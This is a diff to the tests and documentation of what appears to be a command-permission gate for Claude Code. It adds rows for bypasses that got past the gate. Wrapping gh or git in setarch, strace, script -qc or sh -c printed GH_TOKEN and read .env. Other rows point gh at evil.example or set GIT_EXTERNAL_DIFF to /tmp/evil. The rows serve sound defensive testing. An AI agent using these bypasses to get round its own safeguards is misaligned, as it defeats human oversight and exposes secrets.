@@ -74,6 +74,16 @@ claims it makes are each a separate way for it to silently stop working:
     xargs in front of git or a gated prefix is refused wherever it stands
     among the wrappers; its own options are read, so xargs in front of
     anything else (`xargs grep -l git`) is left alone;
+  * a program this gate does not step over still runs what follows it:
+    `setarch x86_64 gh pr view 1 --json number --jq env` printed GH_TOKEN
+    and `script -qc 'git diff /dev/null ./.env' /dev/null` printed the file,
+    because the gh filter rule read gh only as a command's name and a
+    command string is one word to every scan. Behind such a program each
+    word where git or a gated prefix starts, and each command string a word
+    carries, is read as a command of its own, and what is written on the
+    program for it (an assignment, an export, a redirection) is held to the
+    same rules; `setarch x86_64 git diff HEAD` and `sh -c 'git status'`
+    stay allowed, and echo, printf and grep are not read at all;
   * Claude Code's matcher cuts a wrapper's path at its last `/` or `\\`,
     while bash runs the file at that path, so a wrapper is stepped over
     only by its bare name or as `/usr/bin/<name>` or `/bin/<name>`, and
@@ -2222,6 +2232,122 @@ CORPUS: tuple[Row, ...] = (
         "allowed",
         "the word xargs inside an argument is not xargs in the wrapper chain",
     ),
+    Row(
+        "command name",
+        "git status; noglob $G diff /dev/null ./cosign.key",
+        "refused",
+        "noglob is stepped over as a wrapper, so the word after it is held to the literal "
+        "test; read as a name itself, it left $G unread",
+        "Spell every command name literally",
+    ),
+    # A program this gate does not step over runs the words after it, or hands
+    # a shell the string a word carries, and bypass and auto modes prompt for
+    # nothing in front of it (#474). Every refused row below exited 0 before.
+    Row(
+        "command name",
+        "setarch x86_64 gh pr view 1 --json number --jq env",
+        "refused",
+        "setarch runs gh with the words after it; the filter rule read gh only as a "
+        "command's name, so the filter printed GH_TOKEN",
+        "as a command of its own",
+    ),
+    Row(
+        "command name",
+        "strace -o /dev/null gh pr view 1 --json number -q '$ENV'",
+        "refused",
+        "the same behind a tracer with an option value in front of the command",
+        "as a command of its own",
+    ),
+    Row(
+        "command name",
+        "flock git gh pr view 1 --json number --jq env",
+        "refused",
+        "every word where a gated command starts is read, so a lock file named git does not "
+        "hide the gh flock runs after it",
+        "as a command of its own",
+    ),
+    Row(
+        "command name",
+        "script -qc 'git diff /dev/null ./.env' /dev/null",
+        "refused",
+        "script hands the string to a shell, and the plain-file read inside it was one word "
+        "to every scan",
+        "as a command of its own",
+    ),
+    Row(
+        "command name",
+        "script -qc'git diff /dev/null ./.env' /dev/null",
+        "refused",
+        "the same string attached to script's short option",
+        "as a command of its own",
+    ),
+    Row(
+        "command name",
+        "sh -c 'gh pr view 1 --json number --jq env'",
+        "refused",
+        "a shell's -c string is read as a command line",
+        "as a command of its own",
+    ),
+    Row(
+        "command name",
+        "script -qc $'gh pr view 1 --json number --jq \\x65nv' /dev/null",
+        "refused",
+        "the string is read as the shell receives it: $'\\x65' is the letter e",
+        "as a command of its own",
+    ),
+    Row(
+        "command name",
+        "GH_HOST=evil.example setarch x86_64 gh pr list",
+        "refused",
+        "an assignment written on the program is the environment of the gh it runs",
+        "an assignment before a command",
+    ),
+    Row(
+        "command name",
+        "export GIT_EXTERNAL_DIFF=/tmp/evil; setarch x86_64 git diff HEAD",
+        "refused",
+        "an export reaches the git a program runs as it reaches git standing alone",
+        "an assignment made by the export family",
+    ),
+    Row(
+        "command name",
+        ">.env setarch x86_64 git diff HEAD",
+        "refused",
+        "a redirection written on the program is the git command's output, and the shell "
+        "truncates the target before either starts",
+        "an output redirection",
+    ),
+    Row(
+        "command name",
+        "setarch x86_64 git diff HEAD",
+        "allowed",
+        "the command behind the program is read as though it stood alone, and alone it passes",
+    ),
+    Row(
+        "command name",
+        "uname git diff HEAD",
+        "allowed",
+        "a gated command that would pass alone passes behind any program",
+    ),
+    Row(
+        "command name",
+        "bash -c 'git log -1'",
+        "allowed",
+        "a shell's -c string that would pass alone passes",
+    ),
+    Row(
+        "command name",
+        "sh -c \"gh pr list --json title --jq '.[] | .title'\"",
+        "allowed",
+        "the string is unquoted the way bash hands it over, so the single-quoted filter stays "
+        "one quoted word and is not read as a glob",
+    ),
+    Row(
+        "command name",
+        "echo gh pr view 1 --json number --jq env",
+        "allowed",
+        "echo, printf and grep only print or match their words, so they are not read",
+    ),
     # --- 5. an option that loads or writes ---------------------------------
     Row(
         "options",
@@ -2562,13 +2688,15 @@ MUTATIONS: tuple[tuple[str, str, str, str], ...] = (
         "the name search past a wrapper's own options",
         "((after_wrapper)) || command_word_pending=0",
         "command_word_pending=0",
-        "git status; env -i python3 tests/run_tests.py >cosign.pub",
+        # Not the runner's redirection row: the scan of what a program runs
+        # behind it refuses that one too once `-i` is read as the name.
+        "env -i GIT_EXTERNAL_DIFF=/tmp/evil git diff HEAD",
     ),
     (
         "noglob stepped over as a wrapper",
         "nice | noglob | xargs | timeout",
         "nice | xargs | timeout",
-        "noglob python3 tests/run_tests.py >out",
+        "git status; noglob $G diff /dev/null ./cosign.key",
     ),
     (
         "the xargs refusal",
@@ -2586,7 +2714,7 @@ MUTATIONS: tuple[tuple[str, str, str, str], ...] = (
         "a wrapper's typed word cut at a backslash as well as a slash",
         'wrapper="${typed##*[\\\\/]}"',
         'wrapper="${typed##*/}"',
-        "/usr/bin\\timeout 5 python3 tests/run_tests.py >out",
+        "'./shim\\nohup' git diff HEAD",
     ),
     (
         "the words after xargs's command read as its arguments",
@@ -2635,6 +2763,48 @@ MUTATIONS: tuple[tuple[str, str, str, str], ...] = (
         '[[ "${word}" == "blame" || "${word}" == "annotate" ]]',
         '[[ "${word}" == "blame" ]]',
         "git annotate --contents ./cosign.key README.md",
+    ),
+    (
+        "a gated command behind a program read as a command of its own",
+        'read_alone "${command_text}"',
+        "true",
+        "setarch x86_64 gh pr view 1 --json number --jq env",
+    ),
+    (
+        "a command string a word carries read as a command line",
+        'read_alone "${text}"',
+        "true",
+        "script -qc 'git diff /dev/null ./.env' /dev/null",
+    ),
+    (
+        "an ANSI-C quote decoded before the string is read",
+        'printf -v decoded -- "${ansi//%/%%}"',
+        'decoded="${ansi}"',
+        "script -qc $'gh pr view 1 --json number --jq \\x65nv' /dev/null",
+    ),
+    (
+        "echo, printf and grep left unread",
+        "ARGUMENT_ONLY_PROGRAMS=(echo printf grep egrep fgrep)",
+        "ARGUMENT_ONLY_PROGRAMS=()",
+        "echo gh pr view 1 --json number --jq env",
+    ),
+    (
+        "an assignment written on the program",
+        '((seg_assign)) && refuse_behind "${GATED_ENV_MSG}"',
+        "((seg_assign)) && true",
+        "GH_HOST=evil.example setarch x86_64 gh pr list",
+    ),
+    (
+        "an export before the program",
+        '((export_idx >= 0 && seg_hit_idx > export_idx)) && refuse_behind "${EXPORT_ENV_MSG}"',
+        "true",
+        "export GIT_EXTERNAL_DIFF=/tmp/evil; setarch x86_64 git diff HEAD",
+    ),
+    (
+        "a redirection written on the program",
+        "  if ((seg_writes)); then",
+        "  if false; then",
+        ">.env setarch x86_64 git diff HEAD",
     ),
 )
 
